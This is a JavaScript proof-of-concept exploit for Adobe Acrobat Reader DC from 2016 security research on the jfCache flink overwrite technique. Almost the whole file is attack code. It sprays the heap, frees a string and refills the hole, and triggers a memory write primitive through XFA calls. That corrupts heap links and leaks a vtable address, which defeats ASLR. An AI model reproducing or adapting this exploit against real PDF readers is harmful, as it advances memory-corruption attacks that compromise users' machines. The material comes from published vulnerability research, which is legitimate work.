
/*
poc exploit for Adobe Acrobat Reader DC using the jfCache flink overwrite technique as presented at SyScan360 and Infiltrate 2016
by sebastian apelt, siberas, 2016

please note:
in this sample exploit the alloc/free mechanisms for the OS heap are written for spidermonkey 24 to make it work for AR DC! 
if you want the sample exploit to work for AR 10/11 you need to adjust the allocs/frees :)
*/

var gc  = new Array(10000);
gc[gc.length - 1] = 1;

var s = "X";
while(s.length < 0x100000) s += s;
function trigger_gc(amount, length)
{
	/* trigger_gc(100, 0x10000); works fine */
	for(var i=0; i < amount; i++) gc.push(s.substr(0, length).sup());
}

function alloc(size, basestring)
{	
	return basestring.substr(0, (size - 2) / 2).toUpperCase();
}

function allocs(size, count, char)
{
	var tmparr = [];
	var allocstr = char;
	while(allocstr.length < (size + 0x10000)) { allocstr += allocstr; }
	for(var i=0; i < count; i++) { tmparr.push(alloc(size, allocstr)); }	
	return tmparr;
}

app.alert("[!] ready to go");

var targetchar = unescape("%u1010");
var spray_arr = allocs(0xc690, 5000, targetchar); /* same block as 0xc68c */

xfa.isPropertySpecified("[+] sprayed! now defrag target size 0x180");

var objarr = [];
for(var x=0; x < 500; x++)
{ 
	o = xfa.template.createNode("subform");
	o.name = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
	objarr.push(o);	
}

var subform_arr1 = [];
for(var x=0; x < 132; x++) { subform_arr1.push(xfa.template.createNode("subform")); }

xfa.isPropertySpecified("[+] ok, now shoot @ target-address 0x" + 0x10101000.toString(16));

var shotaddress = 0x10101000;

/* trigger 0-DW write for the first time */
trigger(shotaddress);

var string_offset = 0;
var shot_offset = 0;

function trigger(address)
{
	xfa.isPropertySpecified("write0:" + address.toString(16));
}

r = new RegExp("^\u1010*$");
for(var i=0; i < spray_arr.length; i++)
{
	if(r.exec(spray_arr[i]) == null)
	{
		for(x=0; x < spray_arr[i].length; x++)
		{
			if(spray_arr[i][x] != targetchar)
			{
				shot_offset = x;
				string_offset = i;
				break;
			}
		}
	}
	if(shot_offset != 0) break;
}

if(string_offset != 0)
{
	xfa.isPropertySpecified("[+] found in string nr " + string_offset.toString() + ", offset " + shot_offset.toString());
	var str_start = shotaddress - shot_offset * 2; 
	xfa.isPropertySpecified("[+] string start: 0x" + str_start.toString(16));
	
	/* mark the string to be freed */
	delete spray_arr[string_offset]; 
	/* trigger GC */
	trigger_gc(1000, 0x10000); 
	
	xfa.isPropertySpecified("[+] string should be freed. now create strings on jfCache to create a chunk and fill the hole");
	for(var i in subform_arr1) subform_arr1[i].name = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; 
	
	var shootaddress = str_start + 0x184 * 0x80 - 1;
	xfa.isPropertySpecified("[+] string should be replaced by chunk. now shoot @ 0x" + shootaddress.toString(16));
	
	/* trigger 0-DW write for the second time */
	trigger(shootaddress);
	
	found = false;
	for(var x=0; x < 132; x++)
	{
		objarr.push(xfa.form.createNode("template"));
	
		/* 
		- each allocation can potentially trigger the flink mechanism, so we need to search each time
		- max distance is 0x10101000 + 0xc690 - 0x10000000 => we only need to search through the 0x16 preceding chunks
		*/
		for(var i = string_offset-1; i > string_offset-0x17; i--)
		{
			if(r.exec(spray_arr[i]) == null)
			{
				xfa.isPropertySpecified("[+] found overwritten string @ offset " + i.toString());
				for(x=0; x < spray_arr[i].length; x++)
				{
					if(spray_arr[i][x] != targetchar)
					{
						b1 = spray_arr[i].charCodeAt(x+2) >> 8;
						b2 = spray_arr[i].charCodeAt(x+2) & 0xff;
						b3 = spray_arr[i].charCodeAt(x+3) >> 8;
						b4 = spray_arr[i].charCodeAt(x+3) & 0xff;
						vtable = (b3 << 24) | (b4 << 16) | (b1 << 8) | b2;
						found = true;
						break;
					}
				}
			}
			if(found == true) break;
		}
		if(found == true)
		{
			/* free some buffers in 0x180-sized chunks to make sure we don't allocate the block "after" the bad one (since the flink is invalid again, of course) */
			for(var x=0; x < 500; x++) objarr[x].name = "";
			break;
		}
	}
	if(found == false) app.alert("[-] exploit seems to have failed (?)");
	else
	{
		res = "[!] vtable: 0x" + vtable.toString(16) + ", AcroForm.api @ 0x" + (vtable - 0x7ec74c).toString(16) + " => byebye ASLR";
		xfa.isPropertySpecified(res);
		app.alert(res);
	}
}			
else { app.alert("[-] no overwrite found."); }
